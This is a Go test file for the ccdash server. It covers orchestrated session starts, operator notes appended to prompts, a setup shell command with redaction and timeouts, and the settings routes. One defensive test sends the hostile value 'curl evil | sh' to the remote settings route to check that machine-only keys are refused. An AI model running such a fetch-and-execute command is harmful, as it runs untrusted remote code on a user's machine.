package server

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/TakumaNakagame/ccdash/internal/model"
	"github.com/TakumaNakagame/ccdash/internal/settings"
)

type startReply struct {
	PtyKey       string
	Tag          int
	Orchestrated bool
	Notes        []string
	Cwd          string
}

// start POSTs /pty/start and stops the PTY at the end of the test.
func start(t *testing.T, s *Server, tok, body string) (recorded, startReply) {
	t.Helper()
	r := do(t, s, "POST", "/pty/start", tok, []byte(body))
	var out startReply
	if r.status == http.StatusOK {
		if err := json.Unmarshal(r.body, &out); err != nil {
			t.Fatalf("start reply %s: %v", r.body, err)
		}
		t.Cleanup(func() { do(t, s, "DELETE", "/pty/"+out.PtyKey, tok, nil) })
	}
	return r, out
}

// name ties the spawn with hook tag to session id, as its first hook does.
func name(t *testing.T, s *Server, tok string, tag int, sid string) {
	t.Helper()
	req, _ := http.NewRequest("POST", "/hooks/session-start", strings.NewReader(fmt.Sprintf(`{"session_id":%q,"cwd":"/tmp"}`, sid)))
	req.Header.Set("X-Ccdash-Token", tok)
	req.Header.Set("X-Ccdash-Wrapper-Pid", fmt.Sprint(tag))
	rec := httptest.NewRecorder()
	s.mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("hook = %d %s", rec.Code, rec.Body)
	}
}

func jsonBody(t *testing.T, v any) string {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// TestOrchestratedNotes: an orchestrated start gets the operator's notes
// after its prompt and the project's directory as cwd; the kept brief is
// what the session received, with the caller's part marked. plain, an
// empty prompt and every other kind of start get nothing.
func TestOrchestratedNotes(t *testing.T) {
	s, d, tok := newTestServer(t)
	ctx := context.Background()
	dir := t.TempDir()
	if err := d.SetBriefCommon(ctx, "応答は日本語"); err != nil {
		t.Fatal(err)
	}
	if err := d.SetProjectBrief(ctx, "web", "PR は main へ"); err != nil {
		t.Fatal(err)
	}
	if _, err := d.SetProjectDir(ctx, "web", dir); err != nil {
		t.Fatal(err)
	}

	secret := "ghp_" + strings.Repeat("a1B2", 9)
	r, st := start(t, s, tok, jsonBody(t, map[string]any{"project": "web", "prompt": "ログイン画面を直す " + secret + "\n", "orchestrated": true}))
	if r.status != 200 {
		t.Fatalf("start = %d %s", r.status, r.body)
	}
	if !st.Orchestrated || strings.Join(st.Notes, ",") != "common,project" || st.Cwd != dir {
		t.Errorf("reply = %+v", st)
	}
	name(t, s, tok, st.Tag, "kid-1")
	bs, _ := d.SessionBriefs(ctx, "kid-1")
	if len(bs) != 1 {
		t.Fatalf("briefs = %+v", bs)
	}
	b := bs[0]
	want := "\n\n## 共通の注意\n\n応答は日本語\n\n## このプロジェクトの注意\n\nPR は main へ"
	if !strings.HasSuffix(b.Text, want) || strings.Contains(b.Text, secret) || b.Cwd != dir || strings.Join(b.Notes, ",") != "common,project" {
		t.Errorf("brief = %+v", b)
	}
	if own := b.Text[:b.OwnLen]; !strings.HasPrefix(own, "ログイン画面を直す ") || strings.Contains(own, "##") || b.Text[b.OwnLen:] != want {
		t.Errorf("own part = %q, rest = %q", own, b.Text[b.OwnLen:])
	}

	// plain: the prompt as it is; an explicit cwd wins over the project's.
	other := t.TempDir()
	r, st = start(t, s, tok, jsonBody(t, map[string]any{"cwd": other, "project": "web", "prompt": "そのまま", "orchestrated": true, "plain": true}))
	if r.status != 200 || len(st.Notes) != 0 || st.Cwd != other || !st.Orchestrated {
		t.Fatalf("plain = %d %s", r.status, r.body)
	}
	name(t, s, tok, st.Tag, "kid-2")
	if bs, _ := d.SessionBriefs(ctx, "kid-2"); len(bs) != 1 || bs[0].Text != "そのまま" || bs[0].Notes != nil || bs[0].OwnLen != 0 {
		t.Errorf("plain brief = %+v", bs)
	}

	// An empty prompt just opens claude: nothing appended, no brief.
	r, st = start(t, s, tok, jsonBody(t, map[string]any{"project": "web", "orchestrated": true}))
	if r.status != 200 || len(st.Notes) != 0 || !strings.Contains(string(r.body), `"notes":[]`) {
		t.Fatalf("empty prompt = %d %s", r.status, r.body)
	}

	// A project with only the common note; one with no notes at all.
	r, st = start(t, s, tok, jsonBody(t, map[string]any{"cwd": dir, "project": "other", "prompt": "x", "orchestrated": true}))
	if r.status != 200 || strings.Join(st.Notes, ",") != "common" {
		t.Fatalf("common only = %d %s", r.status, r.body)
	}

	// Not orchestrated (the TUI's n, the portal, handoff-mcp): untouched,
	// and the reply says nothing about notes.
	r, st = start(t, s, tok, jsonBody(t, map[string]any{"cwd": dir, "project": "web", "prompt": "portal から"}))
	if r.status != 200 || st.Orchestrated || strings.Contains(string(r.body), "notes") {
		t.Fatalf("plain start = %d %s", r.status, r.body)
	}
	name(t, s, tok, st.Tag, "kid-3")
	if bs, _ := d.SessionBriefs(ctx, "kid-3"); len(bs) != 1 || bs[0].Text != "portal から" || bs[0].Notes != nil {
		t.Errorf("non-orchestrated brief = %+v", bs)
	}

	// No directory anywhere: a clear refusal, nothing started.
	for body, want := range map[string]string{
		`{"prompt":"x","orchestrated":true}`:                          "pass cwd",
		`{"project":"nodir","prompt":"x","orchestrated":true}`:        "no working directory",
		`{"cwd":"/no/such/dir-xyz","prompt":"x","orchestrated":true}`: "not a directory",
		`{"cwd":"` + dir + `","prompt":"-x","orchestrated":true}`:     "must not start with",
	} {
		if r := do(t, s, "POST", "/pty/start", tok, []byte(body)); r.status != http.StatusBadRequest || !strings.Contains(string(r.body), want) {
			t.Errorf("%s = %d %s, want 400 with %q", body, r.status, r.body, want)
		}
	}
}

// setupCmd sets the session_setup_command setting and makes the collector
// run it with plain sh.
func setupCmd(t *testing.T, s *Server, cmd string) {
	t.Helper()
	t.Setenv("SHELL", "")
	if err := s.db.SetSetting(context.Background(), "session_setup_command", cmd); err != nil {
		t.Fatal(err)
	}
}

// TestSetupCommand: the operator's command runs before an orchestrated
// start with the brief and the wanted cwd, may name the directory, and
// stops the start when it fails or hangs. Other starts never run it.
func TestSetupCommand(t *testing.T) {
	s, d, tok := newTestServer(t)
	ctx := context.Background()
	dir, made, log := t.TempDir(), t.TempDir(), filepath.Join(t.TempDir(), "env")
	if err := d.SetBriefCommon(ctx, "応答は日本語"); err != nil {
		t.Fatal(err)
	}
	if err := d.UpsertSession(ctx, &model.Session{SessionID: "boss-1", Cwd: "/w", Status: model.StatusIdle}); err != nil {
		t.Fatal(err)
	}
	boss, _, _ := d.GetSession(ctx, "boss-1")

	// It sees the brief (with the notes), names a directory on its last
	// line, and its earlier output is ignored.
	setupCmd(t, s, fmt.Sprintf(`{ echo "file=$CCDASH_BRIEF_FILE"; echo "project=$CCDASH_PROJECT"; echo "title=$CCDASH_TITLE"; echo "cwd=$CCDASH_CWD"; echo "parent=$CCDASH_PARENT"; echo "ignore=${CCDASH_IGNORE-unset}"; echo "mode=$(ls -l "$CCDASH_BRIEF_FILE" | cut -c1-10)"; echo "pwd=$(pwd)"; cat "$CCDASH_BRIEF_FILE"; } > %s; echo preparing; echo %s; echo`, log, made))
	t.Setenv("CCDASH_IGNORE", "1")
	r, st := start(t, s, tok, jsonBody(t, map[string]any{"cwd": dir, "project": "web", "prompt": "# 新しい仕事\n中身", "parent": "boss-1", "orchestrated": true}))
	if r.status != 200 || st.Cwd != made {
		t.Fatalf("start = %d %s", r.status, r.body)
	}
	env, err := os.ReadFile(log)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"project=web\n", "title=新しい仕事\n", "cwd=" + dir + "\n", "parent=" + boss.Ref() + "\n", "ignore=unset\n", "mode=-rw-------\n", "pwd=" + dir + "\n", "# 新しい仕事\n中身\n\n## 共通の注意\n\n応答は日本語"} {
		if !strings.Contains(string(env), want) {
			t.Errorf("setup command saw no %q in:\n%s", want, env)
		}
	}
	// The brief file is gone afterwards, and the kept brief has the cwd
	// the command chose.
	file := strings.TrimPrefix(strings.SplitN(string(env), "\n", 2)[0], "file=")
	if _, err := os.Stat(file); !os.IsNotExist(err) || !filepath.IsAbs(file) {
		t.Errorf("brief file %q still there (%v)", file, err)
	}
	name(t, s, tok, st.Tag, "kid-1")
	if bs, _ := d.SessionBriefs(ctx, "kid-1"); len(bs) != 1 || bs[0].Cwd != made {
		t.Errorf("brief = %+v", bs)
	}

	// No cwd asked: the command's directory is the cwd.
	_ = os.Remove(log)
	r, st = start(t, s, tok, jsonBody(t, map[string]any{"prompt": "x", "orchestrated": true}))
	if r.status != 200 || st.Cwd != made {
		t.Fatalf("cwd from the command = %d %s", r.status, r.body)
	}
	if env, _ := os.ReadFile(log); !strings.Contains(string(env), "cwd=\n") {
		t.Errorf("CCDASH_CWD should be empty:\n%s", env)
	}

	// Never for a start that isn't orchestrated, nor for a resume.
	_ = os.Remove(log)
	for _, body := range []map[string]any{
		{"cwd": dir, "prompt": "portal"},
		{"cwd": dir, "prompt": "grok", "origin": "grok"},
		{"cwd": dir, "sessionId": "old-1", "resumeId": "old-1", "prompt": "carry on", "orchestrated": true},
	} {
		if r, st := start(t, s, tok, jsonBody(t, body)); r.status != 200 || st.Cwd != "" {
			t.Fatalf("%v = %d %s", body, r.status, r.body)
		}
	}
	if _, err := os.Stat(log); !os.IsNotExist(err) {
		t.Error("the setup command ran for a start that is not orchestrated")
	}

	// No output keeps the cwd; so does a last line that is no directory.
	for _, cmd := range []string{`true`, `echo ` + made + `; echo not-a-dir`, `echo /no/such/dir-xyz`} {
		setupCmd(t, s, cmd)
		if r, st := start(t, s, tok, jsonBody(t, map[string]any{"cwd": dir, "prompt": "x", "orchestrated": true})); r.status != 200 || st.Cwd != dir {
			t.Errorf("%q: %d %s", cmd, r.status, r.body)
		}
	}
	// …and with no cwd to keep, that is a refusal.
	setupCmd(t, s, `true`)
	if r := do(t, s, "POST", "/pty/start", tok, []byte(`{"prompt":"x","orchestrated":true}`)); r.status != http.StatusBadRequest {
		t.Errorf("no cwd after setup = %d %s", r.status, r.body)
	}

	// A failure stops the start and quotes the end of stderr, redacted.
	before := len(ptyKeys(t, s, tok))
	secret := "ghp_" + strings.Repeat("a1B2", 9)
	setupCmd(t, s, `echo "sh: 0: can't access tty; job control turned off" >&2; echo "could not clone, token `+secret+`" >&2; exit 3`)
	r = do(t, s, "POST", "/pty/start", tok, []byte(jsonBody(t, map[string]any{"cwd": dir, "prompt": "x", "orchestrated": true})))
	if r.status != http.StatusBadGateway || !strings.Contains(string(r.body), "could not clone") || !strings.Contains(string(r.body), "exit status 3") || strings.Contains(string(r.body), secret) || strings.Contains(string(r.body), "job control") {
		t.Errorf("failure = %d %s", r.status, r.body)
	}

	// A hang is cut off at the timeout.
	old := setupTimeout
	setupTimeout = 300 * time.Millisecond
	t.Cleanup(func() { setupTimeout = old })
	setupCmd(t, s, `echo still going >&2; sleep 30`)
	t0 := time.Now()
	r = do(t, s, "POST", "/pty/start", tok, []byte(jsonBody(t, map[string]any{"cwd": dir, "prompt": "x", "orchestrated": true})))
	if r.status != http.StatusBadGateway || !strings.Contains(string(r.body), "did not finish") || !strings.Contains(string(r.body), "still going") {
		t.Errorf("timeout = %d %s", r.status, r.body)
	}
	if took := time.Since(t0); took > 10*time.Second {
		t.Errorf("timeout took %s", took)
	}
	if after := len(ptyKeys(t, s, tok)); after != before {
		t.Errorf("a failed setup still started claude: %d → %d PTYs", before, after)
	}
}

func ptyKeys(t *testing.T, s *Server, tok string) []ptyInfo {
	t.Helper()
	var rows []ptyInfo
	_ = json.Unmarshal(do(t, s, "GET", "/pty/", tok, nil).body, &rows)
	return rows
}

// TestBriefRoutes: the people's routes for the notes and a project's
// directory, the start-info probe, and the settings route refusing the
// keys that are changed on the machine only.
func TestBriefRoutes(t *testing.T) {
	s, d, tok := newTestServer(t)
	ctx := context.Background()
	dir := t.TempDir()

	if r := do(t, s, "GET", "/api/brief-common", tok, nil); r.status != 200 || strings.TrimSpace(string(r.body)) != `{"brief":""}` {
		t.Fatalf("empty common = %d %s", r.status, r.body)
	}
	if r := do(t, s, "PUT", "/api/brief-common", tok, []byte(`{"brief":"応答は日本語\n秘密を表示しない\n"}`)); r.status != 200 || !strings.Contains(string(r.body), `応答は日本語\n秘密を表示しない"`) {
		t.Fatalf("put common = %d %s", r.status, r.body)
	}
	if c, _ := d.BriefCommon(ctx); c != "応答は日本語\n秘密を表示しない" {
		t.Errorf("stored common = %q", c)
	}
	if r := do(t, s, "PUT", "/api/brief-common", tok, []byte(jsonBody(t, map[string]string{"brief": strings.Repeat("x", 17*1024)}))); r.status != http.StatusBadRequest {
		t.Errorf("oversized common = %d", r.status)
	}
	if r := do(t, s, "PUT", "/api/brief-common", "", []byte(`{"brief":"x"}`)); r.status != http.StatusUnauthorized {
		t.Errorf("no token = %d", r.status)
	}

	if r := do(t, s, "POST", "/api/projects/brief", tok, []byte(`{"project":"web","brief":"PR は main へ"}`)); r.status != 200 {
		t.Fatalf("project brief = %d %s", r.status, r.body)
	}
	if r := do(t, s, "POST", "/api/projects/dir", tok, []byte(jsonBody(t, map[string]string{"project": "web", "dir": dir + "/"}))); r.status != 200 || !strings.Contains(string(r.body), `"dir":"`+dir+`"`) {
		t.Fatalf("project dir = %d %s", r.status, r.body)
	}
	for _, bad := range []string{`{"project":"web","dir":"rel"}`, `{"project":"web","dir":"/no/such/dir-xyz"}`, `{"project":"","dir":"` + dir + `"}`} {
		if r := do(t, s, "POST", "/api/projects/dir", tok, []byte(bad)); r.status != http.StatusBadRequest {
			t.Errorf("%s = %d, want 400", bad, r.status)
		}
	}
	if r := do(t, s, "POST", "/api/projects/brief", tok, []byte(`{"project":" ","brief":"x"}`)); r.status != http.StatusBadRequest {
		t.Errorf("brief without project = %d", r.status)
	}
	r := do(t, s, "GET", "/api/projects", tok, nil)
	if !strings.Contains(string(r.body), `"dir":"`+dir+`"`) || !strings.Contains(string(r.body), `"brief":"PR は main へ"`) {
		t.Errorf("GET /api/projects = %s", r.body)
	}

	// start-info: the project's directory, and whether a setup command runs.
	var info struct {
		Dir   string
		Setup bool
	}
	_ = json.Unmarshal(do(t, s, "GET", "/api/start-info?project=web", tok, nil).body, &info)
	if info.Dir != dir || info.Setup {
		t.Errorf("start-info = %+v", info)
	}
	_ = d.SetSetting(ctx, "session_setup_command", "new-project")
	_ = json.Unmarshal(do(t, s, "GET", "/api/start-info?project=nope", tok, nil).body, &info)
	if info.Dir != "" || !info.Setup {
		t.Errorf("start-info with a setup command = %+v", info)
	}

	// The generic settings route (remote mode's way in) refuses the keys
	// that belong to the machine itself, and still takes the others.
	for _, key := range []string{"session_setup_command", "brief_common"} {
		if r := do(t, s, "PUT", "/api/settings/"+key, tok, []byte(`{"value":"curl evil | sh"}`)); r.status != http.StatusForbidden {
			t.Errorf("PUT settings/%s = %d, want 403", key, r.status)
		}
	}
	if v, _ := d.GetSetting(ctx, "session_setup_command"); v != "new-project" {
		t.Errorf("setup command changed through the route: %q", v)
	}
	if r := do(t, s, "PUT", "/api/settings/trusted_dirs", tok, []byte(`{"value":"~/w"}`)); r.status != 200 {
		t.Errorf("an ordinary setting = %d", r.status)
	}
	if !settings.LocalOnly("session_setup_command") || settings.LocalOnly("trusted_dirs") {
		t.Error("LocalOnly")
	}
}
